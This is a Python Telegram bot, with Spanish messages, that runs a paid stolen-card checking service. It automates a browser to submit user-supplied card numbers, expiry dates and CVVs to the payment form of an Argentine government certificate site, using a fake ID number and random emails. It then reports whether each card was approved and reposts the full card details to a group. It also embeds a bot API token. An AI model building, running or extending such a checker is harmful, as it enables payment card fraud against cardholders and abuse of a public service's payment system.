import telebot
import asyncio
from playwright.async_api import async_playwright
import random
import string
import requests
import time
from collections import deque
import json
from datetime import datetime, timedelta

API_TOKEN = "7591727242:AAFQl6yxeVJ77OABzQLHYA3OLefxYVWWstU"
bot = telebot.TeleBot(API_TOKEN)

OWNER_ID = 1658470522
GROUP_ID = -1002168776336

queue = deque()
cooldown = {}

def load_subscriptions():
    try:
        with open('subscriptions.json', 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_subscriptions(subscriptions):
    with open('subscriptions.json', 'w') as f:
        json.dump(subscriptions, f, indent=4)

async def completar_formulario(binlargo, mes, anio, code):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        await page.goto("https://tramites.renaper.gob.ar/v2/MACRO_genera.php?tipo_tramite=CERTSOLTERIA")
        email = f"{''.join(random.choices(string.ascii_lowercase, k=8))}@{''.join(random.choices(string.ascii_lowercase, k=5))}.com"
        await page.fill("#dni", "44444444")
        await page.select_option("#sexo", "F")
        await page.fill("#email", email)
        await page.click("button.btn.btn-info:text('Continuar')")
        await page.wait_for_timeout(2000)
        await page.click("a.btn.btn-info:text('CONTINUAR')")
        await page.wait_for_timeout(2000)
        await page.click("input#MainContent_btnTarjeta")
        await page.wait_for_timeout(2000)
        bindata = requests.get(f"https://api.paypertic.com/binservice/{binlargo[:6]}").text.lower()
        if "visa" in bindata and "credit" in bindata:
            await page.select_option("#ddlTarjeta", "1")
        elif "visa" in bindata and "debit" in bindata:
            await page.select_option("#ddlTarjeta", "31")
        elif "mastercard" in bindata and "debit" in bindata:
            await page.select_option("#ddlTarjeta", "105")
        elif "mastercard" in bindata and "credit" in bindata:
            await page.select_option("#ddlTarjeta", "104")
        elif "american express" in bindata:
            await page.select_option("#ddlTarjeta", "111")
        elif "cabal" in bindata:
            await page.select_option("#ddlTarjeta", "63")
        await page.fill("#txtCardNumber", binlargo)
        await page.fill("#txtCardExpirationMonth", mes)
        await page.fill("#txtCardExpirationYear", anio)
        await page.fill("#txtSecurityCode", code)
        await page.click("input#MainContent_btnGenerarTarjeta")
        await page.wait_for_timeout(2000)
        error_text = await page.text_content("body")
        if "aprobada" in error_text.lower():
            await browser.close()
            return True
        await browser.close()
        return False

async def process_queue():
    while queue:
        user_message = queue.popleft()
        tarjeta, mes, anio, codigo = user_message['tarjeta'], user_message['mes'], user_message['anio'], user_message['codigo']
        user_id = user_message['user_id']
        message = user_message['message']
        username = user_message['username']
        result = await completar_formulario(tarjeta, mes, anio, codigo)
        if result:
            formatted_response = (
                "Checkeo de CC | Exitoso\n"
                "✅ Tarjeta aprobada!\n\n"
                "－ － － － － － － － － － － － － － － － －\n"
                f"Número de Tarjeta: {tarjeta}\n"
                f"MM|AA: {mes}|{anio}\n"
                f"CVV: {codigo}\n"
                "－ － － － － － － － － － － － － － － － －\n"
                "Monto: $ 2000\n"
                f"Usuario: @{username}\n"
            )
            bot.reply_to(message, formatted_response)
            bot.send_message(GROUP_ID, formatted_response)
        else:
            formatted_response = (
                "Checkeo de CC | Fallido\n"
                "❌ Tarjeta rechazada!\n\n"
                "－ － － － － － － － － － － － － － － － － － －\n"
                f"Número de Tarjeta: {tarjeta}\n"
                f"MM|AA: {mes}|{anio}\n"
                f"CVV: {codigo}\n"
                "－ － － － － － － － － － － － － － － － － － －\n"
                f"Usuario: @{username}\n"
            )
            bot.reply_to(message, formatted_response)
            bot.send_message(GROUP_ID, formatted_response)
        await asyncio.sleep(1)

@bot.message_handler(commands=['start'])
def handle_start(message):
    bot.reply_to(message, "¡Hola! 👋 Soy tu asistente virtual 💻✨\n\n"
                          "Estoy aquí para ayudarte con el checkeo de tarjetas de manera rápida y segura. "
                          "Solo debes enviarme el formato correcto: /check cc|mes|año|cvv.")

@bot.message_handler(commands=['check'])
def handle_check(message):
    try:
        user_id = message.from_user.id
        current_time = time.time()
        if user_id in cooldown and current_time - cooldown[user_id] < 30:
            remaining_time = 30 - (current_time - cooldown[user_id])
            bot.reply_to(message, f"Debes esperar {int(remaining_time)} segundos antes de usar /check nuevamente.")
            return
        
        subscriptions = load_subscriptions()
        if str(user_id) not in subscriptions or not subscriptions[str(user_id)].get("plan"):
            bot.reply_to(message, "No tienes acceso para usar este comando. Necesitas una suscripción activa, para comprar el acceso contacta a @cardea2 .")
            return
        
        cooldown[user_id] = current_time
        username = message.from_user.username or message.from_user.first_name
        args = message.text.split(" ", 1)
        if len(args) != 2 or "|" not in args[1]:
            bot.reply_to(message, "Uso incorrecto. El formato es:\n/check cc|mes|año|cvv")
            return
        parts = args[1].split("|")
        if len(parts) != 4:
            bot.reply_to(message, "El formato debe ser: /check cc|mes|año|cvv")
            return
        tarjeta, mes, anio, codigo = parts
        if len(tarjeta) != 16 or not tarjeta.isdigit():
            bot.reply_to(message, "La tarjeta debe tener 16 dígitos.")
            return
        if not mes.isdigit() or int(mes) < 1 or int(mes) > 12:
            bot.reply_to(message, "El mes debe tener 2 dígitos y ser válido.")
            return
        if not anio.isdigit() or int(anio) < 24:
            bot.reply_to(message, "El año debe tener 2 dígitos y ser válido.")
            return
        if (len(codigo) != 3 and len(codigo) != 4) or not codigo.isdigit():
            bot.reply_to(message, "El código de seguridad debe tener 3 o 4 dígitos.")
            return
        bot.reply_to(message, "Estamos procesando tu solicitud. Puede que haya otras personas en espera, pero en poco tiempo se procesará tu turno.")
        queue.append({
            'user_id': user_id,
            'message': message,
            'tarjeta': tarjeta,
            'mes': mes,
            'anio': anio,
            'codigo': codigo,
            'username': username
        })
        asyncio.run(process_queue())
    except Exception as e:
        print(e)
        bot.reply_to(message, f"Ocurrió un error: {e}")

@bot.message_handler(commands=['acceso'])
def handle_acceso(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "No tienes permisos para ejecutar este comando.")
        return
    args = message.text.split(" ", 2)
    if len(args) != 3:
        bot.reply_to(message, "Uso incorrecto. El formato es: /acceso @usuario plan")
        return
    user_id = message.from_user.id
    plan = args[2].lower()
    if plan not in ["semanal", "mensual", "permanente"]:
        bot.reply_to(message, "El plan debe ser: semanal, mensual o permanente.")
        return
    subscriptions = load_subscriptions()
    subscriptions[str(user_id)] = {"plan": plan, "start_date": str(datetime.now())}
    save_subscriptions(subscriptions)
    bot.reply_to(message, f"Se ha asignado el plan {plan} a {username}.")

@bot.message_handler(commands=['remove'])
def handle_remove(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "No tienes permisos para ejecutar este comando.")
        return
    args = message.text.split(" ", 1)
    if len(args) != 2:
        bot.reply_to(message, "Uso incorrecto. El formato es: /remove @usuario")
        return
    username = args[1]
    subscriptions = load_subscriptions()
    for user_id in subscriptions:
        if subscriptions[user_id].get('username') == username:
            del subscriptions[user_id]
            save_subscriptions(subscriptions)
            bot.reply_to(message, f"Se ha eliminado a {username} de la base de datos.")
            return
    bot.reply_to(message, f"@{username} no tiene acceso.")
    
bot.polling()
